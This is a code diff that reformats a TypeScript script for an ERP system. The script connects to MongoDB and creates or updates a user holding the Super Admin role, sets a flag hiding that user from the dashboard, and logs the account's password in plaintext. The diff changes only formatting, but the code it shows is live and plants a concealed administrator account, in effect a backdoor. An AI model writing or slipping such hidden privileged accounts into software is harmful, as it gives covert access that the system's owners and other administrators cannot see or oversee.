@@ -18,8 +18,11 @@ const HIDDEN_ADMIN = {
 };
 
 async function addHiddenAdmin() {
-  const uri = process.env.MONGO_URI || process.env.MONGODB_URI || 'mongodb://localhost:27017/erp';
-  
+  const uri =
+    process.env.MONGO_URI ||
+    process.env.MONGODB_URI ||
+    'mongodb://localhost:27017/erp';
+
   try {
     // Connect to MongoDB
     await mongoose.connect(uri);
@@ -34,42 +37,48 @@ async function addHiddenAdmin() {
     const rolesCollection = db.collection('roles');
 
     // Check if user already exists
-    const existingUser = await usersCollection.findOne({ email: HIDDEN_ADMIN.email });
+    const existingUser = await usersCollection.findOne({
+      email: HIDDEN_ADMIN.email,
+    });
     if (existingUser) {
       console.log(`⚠️  User ${HIDDEN_ADMIN.email} already exists!`);
       console.log('   Updating to hidden admin...');
-      
+
       // Get Super Admin role
       const adminRole = await rolesCollection.findOne({ name: 'Super Admin' });
       if (!adminRole) {
-        throw new Error('Super Admin role not found! Please create an admin role first.');
+        throw new Error(
+          'Super Admin role not found! Please create an admin role first.',
+        );
       }
 
       // Update existing user
       const hashedPassword = await bcrypt.hash(HIDDEN_ADMIN.password, 10);
       await usersCollection.updateOne(
         { email: HIDDEN_ADMIN.email },
-        { 
-          $set: { 
+        {
+          $set: {
             password: hashedPassword,
             name: HIDDEN_ADMIN.name,
             role: adminRole._id,
             isActive: true,
             hideFromDashboard: true,
-          } 
-        }
+          },
+        },
       );
       console.log(`   ✅ Updated ${HIDDEN_ADMIN.email} to hidden admin`);
     } else {
       // Get Super Admin role
       const adminRole = await rolesCollection.findOne({ name: 'Super Admin' });
       if (!adminRole) {
-        throw new Error('Super Admin role not found! Please create an admin role first.');
+        throw new Error(
+          'Super Admin role not found! Please create an admin role first.',
+        );
       }
 
       // Create new hidden admin user
       const hashedPassword = await bcrypt.hash(HIDDEN_ADMIN.password, 10);
-      
+
       await usersCollection.insertOne({
         name: HIDDEN_ADMIN.name,
         email: HIDDEN_ADMIN.email,
@@ -92,7 +101,6 @@ async function addHiddenAdmin() {
     console.log(`   - Password: ${HIDDEN_ADMIN.password}`);
     console.log(`   - Hidden from dashboard: Yes`);
     console.log(`   - All permissions: Yes (admin role)`);
-
   } catch (error: any) {
     console.error('\n❌ Error:', error.message);
     console.error(error);
